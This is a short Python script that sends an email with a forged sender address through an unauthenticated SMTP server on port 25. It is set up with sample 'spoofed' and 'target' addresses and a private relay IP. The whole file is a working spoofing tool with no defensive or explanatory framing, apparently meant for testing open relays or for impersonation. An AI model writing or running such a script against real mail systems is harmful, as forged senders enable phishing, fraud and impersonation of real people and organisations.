import smtplib

def send_spoofed_email(smtp_server, port, from_address, to_address, subject, message):
    try:
        # Set up the SMTP connection
        server = smtplib.SMTP(smtp_server, port)
        server.ehlo()  # Identify yourself to the SMTP server
        # Note: No authentication for this example as SMTP server is on port 25 and might not require it

        # Construct the email headers and body
        email_message = f"""\
From: {from_address}
To: {to_address}
Subject: {subject}

{message}
"""
        # Send the email
        server.sendmail(from_address, [to_address], email_message)
        print("Email sent successfully!")
        
        # Close the SMTP connection
        server.quit()
    except Exception as e:
        print(f"Failed to send email: {e}")

# Configuration
smtp_server = "10.2.2.3"
port = 25
from_address = "spoofed@example.com"
to_address = "target@example.com"
subject = "Test Email"
message = "This is a test email with a spoofed sender address."

# Send the spoofed email
send_spoofed_email(smtp_server, port, from_address, to_address, subject, message)

